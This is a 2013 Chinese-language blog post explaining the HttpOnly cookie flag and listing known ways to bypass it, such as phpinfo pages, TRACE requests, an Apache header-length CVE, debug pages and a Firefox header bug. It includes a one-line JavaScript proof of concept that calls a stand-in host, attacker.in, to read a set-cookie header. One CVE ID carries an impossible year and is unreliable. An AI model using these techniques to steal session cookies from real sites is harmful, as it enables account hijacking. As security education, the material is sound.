---
layout: post
title: "HttpOnly的那些事"
description: "HttpOnly的来源，发展和弱点"
category: web
tags: ["websecurity","xss"]
published: true
disqus: y
date: 2013-03-24 20:55:47 +0800
---


### HttpOnly简介
故名思议，`HttpOnly`是指仅在`HTTP`层面上传输的`Cookie`，当设置了`HttpOnly`标志后，客户端脚本就无法读写该`Cookie`，这样能有效的防御`XSS`攻击。`HttpOnly`是由微软在`2002`年首先在`Internet Explorer 6 SP1`上实现。根据微软的[描述](http://msdn2.microsoft.com/en-us/library/ms533046.aspx)，`HttpOnly`是`HTTP Set-Cookie`头中的一个附加标志，下面的例子就是一个头信息中设置了`HttpOnly Cookie`。
 
    Set-Cookie: USER=123; expires=Wednesday, 09-Nov-99 23:12:40 GMT; HttpOnly

目前，基本上所有的浏览器和web框架都支持`HttpOnly`。

<!--more-->

### 得到HttpOnly Cookie
##### phpinfo信息
`phpinfo`页面可以包含了`cookie`信息，其中同样存在`HttpOnly Cookie`，如下图。
![phpinfo()信息](/resources/2013-03-25-01.png)
##### 支持TRACE方法的服务器
`Apache`支持的一个`Header`是`TRACE`，`TRACE`一般是用于调试，他会将请求头作为`HTTP Response Body`返回。利用这个特性，可以把`HttpOnly Cookie`读出来。不过目前各厂商已经禁止通过`Ajax`发送`TRACE`请求。
##### CVE-2012-0053
`Apache 2.2.x`多个版本没有严格限制`HTTP`请求头信息，`HTTP`请求头信息超过`LimitRequestFieldSize`长度时，服务器返回`400`错误，并在返回信息中将出错的请求头内容输出。利用这个特性，可以得到`HttpOnly Cookie`。
##### Django等一些web框架的调试页面
开启了调试模式的一些框架，会将程序的信息输出，其中就有`Cookie`信息。
##### CVE-3009-0357
`Firefox <= 1.9.1`在处理`HttpOnly Cookies`时存在bug，通过`getResponseHeader()`得不到`HttpOnly Cookie`，但是通过`getAllResponseHeaders()`可以得到。
##### Java getHeaderField
POC:

```javascript
    alert(new java.net.URL('http://attacker.in/xss/cookie.php').openConnection().getHeaderField('set-cookie'));
```

### 参考
1. [https://www.owasp.org/index.php/HttpOnly](https://www.owasp.org/index.php/HttpOnly)
2. [http://seckb.yehg.net/2012/06/xss-gaining-access-to-httponly-cookie.html](http://seckb.yehg.net/2012/06/xss-gaining-access-to-httponly-cookie.html)
3. [https://bugzilla.redhat.com/show_bug.cgi?id=785069](https://bugzilla.redhat.com/show_bug.cgi?id=785069)
4. [https://bugzilla.mozilla.org/show_bug.cgi?id=380418](https://bugzilla.mozilla.org/show_bug.cgi?id=380418)
